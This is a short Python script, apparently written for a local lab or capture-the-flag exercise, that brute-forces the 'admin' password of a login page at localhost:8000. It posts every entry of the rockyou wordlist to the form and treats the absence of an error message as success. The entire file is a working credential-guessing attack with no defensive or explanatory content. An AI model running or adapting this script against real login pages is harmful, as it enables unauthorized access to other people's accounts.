import requests

URL = "http://localhost:8000/login.php"

USER = "admin"
ERR = "Incorrect information."
found = False
i = 0 
with open("/usr/share/wordlists/rockyou.txt") as f : 
	while True : 
		password = f.readline().strip()
		paylaod = {"Username":USER,"Password":password,"Submit":"Login"}

		resp = requests.post(URL,data=paylaod).text
		if ERR not in resp :
			found = True 
			break
		if password == "butterfly5" : print("here")
		print(i,end="\r")
		i+=1

if found :
	print(f"The password for the user admin is : {password}")
else : 
	print("Couldn't find password for user admin")